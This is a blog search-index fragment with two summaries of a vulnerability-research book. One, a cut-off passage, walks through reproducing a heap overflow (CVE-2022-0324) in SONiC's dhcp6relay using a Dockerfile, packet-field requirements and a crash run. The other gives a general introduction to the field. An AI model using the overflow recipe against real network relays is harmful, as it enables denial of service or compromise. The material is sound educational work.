./autogen.sh RUN ./configure RUN make RUN make install RUN ldconfig # Build dhcp6relay WORKDIR ../dhcp6relay RUN sed -i \u0026#39;8s/$/ -g/\u0026#39; Makefile RUN sed -i \u0026#39;24s/.*/\\t$(CC) $(CFLAGS) -o $(DHCP6RELAY_TARGET) $(OBJS) $(LIBS) $(LDFLAGS)/\u0026#39; \\ Makefile RUN make # Configure redis RUN sed -i \u0026#39;109s/# / /\u0026#39; /etc/redis/redis.conf RUN sed -i \u0026#39;109s/\\/var\\/run\\/redis\\/redis-server.sock/\\/var\\/run\\/redis\\/redis.sock/\u0026#39; \\ /etc/redis/redis.conf RUN sed -i \u0026#39;110s/# / /\u0026#39; /etc/redis/redis.conf RUN sed -i \u0026#39;110s/700/755/\u0026#39; /etc/redis/redis.conf # Copy add ipv6 address script COPY add_ipv6_addresses.sh add_ipv6_addresses.sh RUN chmod +x add_ipv6_addresses.sh COPY exploit.py /tmp/exploit.py # copy add ipv6 address script COPY add_ipv6_addresses.sh add_ipv6_addresses.sh RUN chmod +x add_ipv6_addresses.sh Place this Dockerfile in a folder with the add_ipv6_addresses.sh script.\nNow build and run it with:\n$ docker build -t dhcp6relay . $ docker run -it --cap-add=NET_ADMIN --sysctl net.ipv6.conf.all.disable_ipv6=0 dhcp6relay Finally, run the script and start dhcp6relay :\nroot@8928b41ace8c:/sonic-buildimage/src/dhcp6relay# ./add_ipv6_addresses.sh Stopping redis-server: redis-server. Starting redis-server: redis-server. (integer) 1 root@8928b41ace8c:/sonic-buildimage/src/dhcp6relay# ./dhcp6relay Building the Proof of Concept You must send bytes that match the dhcpv6_relay_msg and dhcpv6_option structs, as src/dhcp6relay/src/relay.h defines :\nThe link_address and peer_address members of the dhcpv6_relay_msg struct are of the in6_addr struct type, which is not a custom struct defined in relay.h but instead a shared type from the Linux operating system itself (see ipv6 man).\nThis struct contains a single unsigned char s6_addr[16] member.\nNote that the dhcpv6_relay_msg struct definition includes the PACKED attribute, which means that the compiler doesn’t add padding between the struct’s members to align with memory boundaries. Without this attribute, the compiler might, for example, add 3 or 7 bytes between msg_type and hop_count to align with 4- or 8-byte boundaries, depending on whether the target is a 32 or 64-bit system.\nAfter confirming the data structures, recall the specific requirements for these bytes to reach the vulnerable sink:\nWhen parsed into a dhcpv6_msg struct, the payload’s msg_type member must equal DHCPv6_MESSAGE_TYPE_RELAY_REPL . The payload must include at least one dhcpv6_option struct after the dhcpv6_relay_msg struct. (See Packet Schema ) When parsed into a dhcpv6_option struct, the option_code member must equal OPTION_RELAY_MSG (9). You can re-create the bytes matching these requirements using the socket and struct libraries. In particular, the pack function converts values (such as strings or integers)\nThe sink-to-source analysis revealed that the vulnerability lay in an overly large option_length being used as the size of a memcpy to a 4,096-byte destination buffer, so set option_length to the maximum 65535 value and add additional overflow bytes to the end of the payload. Since dhcp6relay converts the values of option_code and option_length from network to host byte order, convert these values to network byte order first using socket.htons.\nNext, rebuild the container image and start a new session:\n$ docker build -t dhcp6relay . $ docker run -it --cap-add=NET_ADMIN --sysctl net.ipv6.conf.all.disable_ipv6=0 dhcp6relay root@743a13d9862c:/sonic-buildimage/src/dhcp6relay# ./add_ipv6_addresses.sh Stopping redis-server: redis-server. Starting redis-server: redis-server. (integer) 1 root@743a13d9862c:/sonic-buildimage/src/dhcp6relay# ./dhcp6relay Start a second interactive session by listing the running containers and starting bash in the current one:\n$ docker exec -it 743a13d9862c bash root@743a13d9862c:/sonic-buildimage/src/dhcp6relay# python3 /tmp/exploit.py You should observe a segmentation fault in your first session when you run dhcp6relay:\nroot@743a13d9862c:/sonic-buildimage/src/dhcp6relay# ./dhcp6relay Segmentation fault To perform a quick triage of the crash, debug dhcp6relay using gdb , run the program on gdb with run command and check where the vulnerability appears with backtrace.\nReviewing each step in discovering CVE-2022-0324 demonstrated the key principle of selection in the sink-to-source tactic.\n","permalink":"http://localhost:1313/book-reviews/from-day0-to-0day-chapter-1/","title":"From Day 0 to 0day Chapter 1"},{"content":"\nThis is my summary and review of the book From Day Zero to Zero Day by Eugene \u0026ldquo;Spaceraccoon\u0026rdquo; Lim, a security researcher and white-hat hacker.\nHe learned rapidly because his first training was in how to learn. - Frank Herbert, Dune.\nWith the number of discovered and exploited zero days constantly growing, vulnerability research, or the process of analyzing systems for new vulnerabilities, has assumed a critical role in cybersecurity.\nMost write-ups on zero-day findings describe what the vulnerability is, but not how it was discovered. The methodologies for finding particular vulnerabilities can vary greatly. You’ll learn about the basics of reporting vulnerabilities, what vulnerability research is (and isn’t), and its three main disciplines: code review, reverse engineering, and fuzzing.\nWhat Is a Vulnerability? Weakness in an information system, system security procedures, internal controls, or implementation that could be exploited or triggered by a threat source.\nSource : NIST\nFirst, a vulnerability must be a flaw in the design or implementation of a system. This means that if exploited, the vulnerability causes the system to act in an insecure manner that wasn’t intended by the developers.\nThe Common Vulnerability Scoring System (CVSS) industry standard uses the Confidentiality, Integrity, and Availability a (CIA) triad to evaluate the impact of vulnerabilities:\nConfidentiality :An attacker can access data they’re not authorized to access. Integrity : An attacker can modify data they’re not authorized to modify. Availability : An attacker can disrupt access to the system itself. These components describe how a successfully exploited vulnerability can impact a system and provide a useful lens to characterize a vulnerability.\nFor example, a vulnerability that allows an attacker to write arbitrary files in a system affects the integrity of the system but doesn’t necessarily impact confidentiality.\nWhile this won’t be at the top of your mind when looking for vulnerabilities, it’s helpful when communicating your findings to others, such as when you’re writing a vulnerability disclosure report.\nCommon Vulnerabilities and Exposures Records A Common Vulnerabilities and Exposures (CVE) identifier, such as CVE-2020-19909 or CVE-2020-21469, is a unique reference assigned to a publicly disclosed vulnerability.\nThe MITRE Corporation manages the system that publishes these identifiers, which have gradually become a global standard for referencing known vulnerabilities.\nHowever, although many consider a CVE Record to be an “official” vulnerability, this isn’t the case; it’s nice to get a CVE assigned for a vulnerability you discovered, but not all vulnerabilities have CVEs, nor are all CVEs actual vulnerabilities.\nThe CVE Program has grown organically into a de facto industry reference, rather than being established as a formal international standard.\nIt’s actually a federated system of CVE Numbering Authorities (CNAs) that can assign CVE identifiers to vulnerabilities that fall within their scope.\nFor example, a vendor CNA has the authority to assign CVE IDs to vulnerabilities affecting their own products, allowing them to control the CVE publication process.\nWhile there are common CVE assignment rules and a central CVE request form that goes to the root CNA (MITRE), the assignment of CVE IDs is still fairly decentralized and left to the discretion of CNAs, which can lead to erroneous CVEs being published.\nIncorrect Reporting of Vulnerabilities The frequent conflation of bugs and vulnerabilities is a common cause of erroneous reporting.\nFor example, the curl and Postgres projects have both rejected vulnerability disclosures that could be considered bugs but weren’t vulnerabilities.\nCVE-2020-19909 vulnerability record for curl: Integer overflow vulnerability in tool_operate.c in curl 7.65.2 via a large value as the retry delay. This exploit scenario doesn’t cross a security boundary during normal usage of curl by a local user either, since they’d already be able to control --retry-delay directly . This is not especially plausible because the overflow only happens if the user was trying to specify that curl should wait weeks (or longer) before trying to recover from a transient error.\nSource: Daniel haxx\nCVE-2020-21469 the disputed vulnerability record for Postgres, which states: An issue was discovered in PostgreSQL 12.2 allows attackers to cause a denial of service via repeatedly sending SIGHUP signals. In order to exploit this vulnerability, the attacker needs to already have access to an account with elevated privileges, such as:\nA PostgreSQL superuser (postgres) . A user that was granted permission to execute pg_reload_conf by a Postsgres superuser A privileged operating system user .\nSource: Postgres What Is Zero-Day Vulnerability Research? Zero-day vulnerability research is the systematic process of analyzing software and hardware targets to discover security vulnerabilities.\nThis covers most technology, from desktop applications to IoT devices to operating system kernels.\nVulnerability research focuses on individual components, such as a particular driver in an operating system or a network service in an IoT device.\nBy isolating particular components we can generalize techniques that are applicable across components, such as reverse engineering shared libraries or fuzzing network protocols.\nVulnerability Research vs. Penetration Testing . Vulnerability research and penetration testing share common techniques and tools, but they differ in their goals.\nPenetration testing aims to find and exploit vulnerabilities in a particular system, whether it’s a web application or a network. These vulnerabilities aren’t necessarily new.\nVulnerability research aims to discover vulnerabilities in software or hardware targets. If you discover a new vulnerability in a router, all networks that use this router are theoretically at risk. It not limited to one enterprise but all enterprise using it.\nIf you discover a buffer overflow that overwrites return address pointers on the stack in a program, a simple proof of concept (PoC) that triggers this is sufficient for vulnerability research.\nDeveloping a full blown exploit that executes arbitrary shellcode falls under exploit development the process of creating tools or code that exploits vulnerabilities—and is a necessary step in a penetration test.\nAnother major feature of vulnerability research is the use of static and dynamic analysis, including reverse engineering, to analyze a target.\nPenetration tests often attempt to assess the real-world security posture of a target and may be confined to black-box (with no knowledge of the internal implementation of the target) techniques on external attack surfaces, such as testing the requests made to a web application.\nVulnerability research, on the other hand, focuses on white-box (with knowledge of the internals, such as source code) and gray-box (with only partial knowledge of the internals) analysis, finding weaknesses through an \u0026ldquo;inside out\u0026rdquo; perspective by using code review and reverse engineering techniques.\nThus, vulnerability research is more effective at discovering deeper vulnerabilities.\nDisciplines and Techniques As mentione earlier, vulnerability research comprises three main disciplines: code review, reverse engineering, and fuzzing.\nCode Review : is the process of analyzing the source code of a system to identify vulnerabilities. Code review often appears easier than reverse engineering or fuzzing, but the difficulty of discovering a vulnerability doesn’t correlate with its criticality, it begins with the fundamental skill of manual source-to-sink tracing before diving into automated code analysis tools.\nReverse Engineering :\nReverse engineering involves taking apart software, such as binary executable files compiled from source code, to reveal and analyze its inner workings.\nAlthough this may appear more daunting than analyzing human-readable code, it’s an exciting opportunity because many targets rely on security by obscurity to hide blatant weaknesses.\nWhile code review is similar to reading a complicated map to find your way from point A to point B, reverse engineering is like exploring a dark tunnel that may reveal unexpected treasures at the next turn.\nReverse engineering doesn’t focus only on lower-level assembly code, as we can compile binaries into intermediate languages like Java bytecode or even include embedded interpreters for scripting languages like JavaScript.\nFuzzing :\nFinally, fuzzing provides a highly automated means of finding vulnerabilities by hammering a target with various invalid or unexpected inputs.\nYou’ll learn to optimize your fuzzing by writing fuzzing harnesses that fuzz interesting or neglected parts of a target. Writing an optimal fuzzing harness draws on many code review and reverse engineering concepts.\nModern coverage-guided fuzzing uses more advanced and effective means of enumerating a target.\nSelecting a Vulnerability Research Target Practicing target selection greatly increases your chances of finding a vulnerability. As you’ll see, picking a good target for research can be challenging because a target isn’t guaranteed to be vulnerable.\nWe can use a rule of three similar to the CIA triad to choose a target: familiarity, availability, and impact.\nFamiliarity : Familiarity is how much is known about the target. You should pick a target that’s written in a programming language or framework you’re comfortable with.\nYou don’t need to be an expert in exploiting language-specific vulnerabilities so long as you can follow the code.\nIn some cases, the target may have been researched before or is well documented.\nConference talks, whitepapers, and vulnerability write-ups provide valuable information that can speed up your familiarization process.\nWhile you may want to avoid a hardened target that has been thoroughly researched before by others, I’ve found that popular targets are constantly changing and adding new features.\nDon’t give up on them before even trying! Consider the platform the code targets as well, as this factor affects the types of vulnerabilities you can exploit and your ability to discover them. Is it a web application or a native shared library ?\nDoes it call Windows APIs ? Will it run on the client or server ? Also consider whether the target uses well-known protocols and standards; having documentation allows you to recognize common functions and routines that are part of these standards and save time in identifying them.\nAvailability :\nUnlike in the CIA triad, availability in the context of vulnerability research means how easy it is to access and analyze the target.\nIs it on SourceForge (you’d be surprised how many older projects live there) or GitHub ? Also consider how difficult it’ll be to set up a testing environment for your target.\nTest potential vulnerabilities while reviewing the code to validate your assumptions about how it works.\nOne final consideration is the accessibility of the project owners.\nIf you find a vulnerability, someone should be available to acknowledge and patch the bug (like a security@apache.org email of Apache Software Foundation) .\nKeep in mind that some project owners might not welcome or be able to respond to vulnerability reports.\nImpact :\nThe Impact is the importance of the target.\nWhile farming vulnerabilities in a dead, decades-old project might be educational, it’s not impactful if no one uses it. At the same time, dead projects could be far more important than they appear; for example, a dead project could be the only known parsing library for a legacy file format some major software uses to maintain backward compatibility.\nThere are plenty of metrics to gauge a project’s impact, such as GitHub stars ⭐ or forks, download counts, and usage in other projects.\nWhere to Explore Projects With these considerations in mind, picking a suitable target from the millions of available codebases can be challenging.\nI recommend exploring GitHub projects by topic at https://github.com/topics , then filtering by programming language and sorting by stars, forks, or last update time.\nAdditionally, you can explore up-and-coming projects that may not have experienced much scrutiny by other vulnerability researchers on GitHub’s Trending page : https://github.com/trending .\nAnother option is to browse project directories like the Apache Software Foundation’s (https://projects.apache.org).\nThe directory allows sorting by name, committee, category, programming language, and number of committers.\nHowever, avoid focusing on finding bugs in “in the attic” (end-of-life) projects, as you’re unlikely to get a response to security reports about these.\n","permalink":"http://localhost:1313/book-reviews/from-day0-to-0day-chapter-0/","title":"From Day 0 to 0day Chapter 0"}]